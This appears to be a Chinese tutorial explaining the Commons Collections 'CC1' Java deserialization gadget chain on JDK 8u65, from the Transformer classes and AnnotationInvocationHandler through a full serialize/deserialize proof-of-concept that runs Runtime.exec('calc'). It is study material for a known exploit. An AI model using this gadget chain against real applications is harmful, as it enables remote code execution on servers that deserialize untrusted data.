# 0x01 Environment Build

* JDK版本：**jdk 8u65**

* ```xml
  <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.2.1</version>
  </dependency>
  ```

源码里面都是`.class`文件，反编译的代码不好阅读，需下载`.java`源码，<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">点击zip下载</a>
解压jdk8u65的src.zip，将下载后的源码（src\share\classes）的sun文件夹拷贝到解压后的src文件夹

IDEA =》Project Structure =》Platform Settings =》 SDKs =》8u65 =》 SourcePath

另外Maven下载的Commons Collection 也是`.class`文件，点击`Download Sources`

若无效试试`dependency:resolve -Dclassifier=sources`

# 0x02 Transformer Glance

* ## Transformer

  ```java
  public interface Transformer {
      public Object transform(Object input);
  }
  ```

  `Transformer`是一个接口，预定义的`transform()`方法能接受任意类型参数
  接口下面有几个重要的实现类，且都实现了`Serializable`接口。

* ## ConstantTransformer

  ```java
  public class ConstantTransformer implements Transformer, Serializable {
      private final Object iConstant;
      public ConstantTransformer(Object constantToReturn) {
          super();
          iConstant = constantToReturn;
      }
      public Object transform(Object input) {
          return iConstant;
      }
  }
  ```

  调用`transform()`方法返回构造时传入的对象
  就是传入传出一个对象，前后不变。

* ## InvokerTransformer

  ```java
  public class InvokerTransformer implements Transformer, Serializable {
      public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
          super();
          iMethodName = methodName;
          iParamTypes = paramTypes;
          iArgs = args;
      }
      public Object transform(Object input) {
          if (input == null) {
              return null;
          }
          try {
              Class cls = input.getClass();
              Method method = cls.getMethod(iMethodName, iParamTypes);
              return method.invoke(input, iArgs);
          } // catch ....
      }
  }
  ```

  反序列化利用的关键类，可以执行任意方法。

  * iMethodName 待执行的方法名
  * iParamTypes 待执行方法的参数列表的参数类型
  * iArgs 待执行方法的参数列表

  调用`transform`的时候会执行input对象的iMethodName方法

* ## ChainedTransformer

  ```java
  public class ChainedTransformer implements Transformer, Serializable {
      public ChainedTransformer(Transformer[] transformers) {
          super();
          iTransformers = transformers;
      }
      public Object transform(Object object) {
          for (int i = 0; i < iTransformers.length; i++) {
              object = iTransformers[i].transform(object);
          }
          return object;
      }
  }
  ```

  将多个`Transformer`串成一条链，前一个回调返回的结果作为后一个回调的参数

* ## TransformedMap

  ```java
  public class TransformedMap{
      public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
          return new TransformedMap(map, keyTransformer, valueTransformer);
      }
      protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
          super(map);
          this.keyTransformer = keyTransformer;
          this.valueTransformer = valueTransformer;
      }
      protected Object checkSetValue(Object value) {
          return valueTransformer.transform(value);
      }
  }
  ```

  `TransformedMap`用于对Java原生Map进行一些修饰，当Map调用`setValue`时，会触发`checkSetValue`，进而调用`transform`。其构造方法被protected修饰，因此我们利用它的静态public方法`decorate`

# 0x03 Best Practice

使用`Transformer`的实现类和`TransformedMap`实现命令执行

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.getRuntime()),
    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map<Object, Object> map = new HashedMap();
Map<Object, Object> evilMap = TransformedMap.decorate(map, null, chainedTransformer);
evilMap.put("test", 123);
```

两个问题：

* Runtime类没有实现`Serializable`接口，无法反序列化
* 需要找到`readObject`中有类似`Map.put(xxx,yyy)`操作的类

Q1：`Class`类可以反序列化，用`Runtime.class`作为`ChainedTransformer`的入口参数，后面再通过反射来调用exec
```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map<Object, Object> map = new HashedMap();
Map<Object, Object> evilMap = TransformedMap.decorate(map, null, chainedTransformer);
evilMap.put("test", 123);
```

Q2：Introducing  ~  **AnnotationInvocationHandler**

```java
// sun.reflect.annotation.AnnotationInvocationHandler#readObject
private void readObject(java.io.ObjectInputStream s) {
    s.defaultReadObject();

    // Check to make sure that types have not evolved incompatibly

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                  value instanceof ExceptionProxy)) {
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                        annotationType.members().get(name)));
            }
        }
    }
}
```

`memberValue.setValue`  =》`TransformedMap#checkSetValue` =》 `valueTransformer.transform()`

因此让`memberValue`为上面的evilMap即可。

* PROBLEM THROW：
  需要满足`memberType != null`才能进入`memberValue.setValue`

`Class<?> memberType = memberTypes.get(name);`
memberTypes👇                                                                                                                       name👇
`Map<String, Class<?>> memberTypes = annotationType.memberTypes();`           `String name = memberValue.getKey();`
annotationType👇
`annotationType = AnnotationType.getInstance(type);`

构造函数：

```java
AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues)
```

type是构造对象时传进来的`Annotation子类`的`Class`
name是传入Map（memberValues）的每个键名

`memberType.get(name)`要不为空即要求`AnnotationType`要有名为`name`的成员

```java
System.out.println(AnnotationType.getInstance(Target.class).memberTypes());
// {value=class [Ljava.lang.annotation.ElementType;}
System.out.println(AnnotationType.getInstance(Retention.class).memberTypes());
// {value=class java.lang.annotation.RetentionPolicy}
```

@Retention和@Target都有`value`这个成员

另外，`AnnotationInvocationHandler`的构造方法被default修饰，不能直接new，利用反射来实例化该类

# 0x04 Weave POC

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map<Object, Object> map = new HashedMap();
map.put("value", 123);
Map<Object, Object> evilMap = TransformedMap.decorate(map, null, chainedTransformer);
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
cons.setAccessible(true);
Object aih = cons.newInstance(Target.class, evilMap);

// 序列化
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(aih);
oos.close();

// 反序列化
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
Object o = (Object) ois.readObject();
ois.close();
```

# 0x05 CC1 Shortcut

`sun.reflect.annotation.AnnotationInvocationHandler`作为CC1链的入口类，
在Java 8u71之后被修改了
修改后的`readObject`方法中新建了一个`LinkedHashMap`对象，并将原来的键值添加进去。
所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执
行setValue或put操作，也就不会触发RCE了。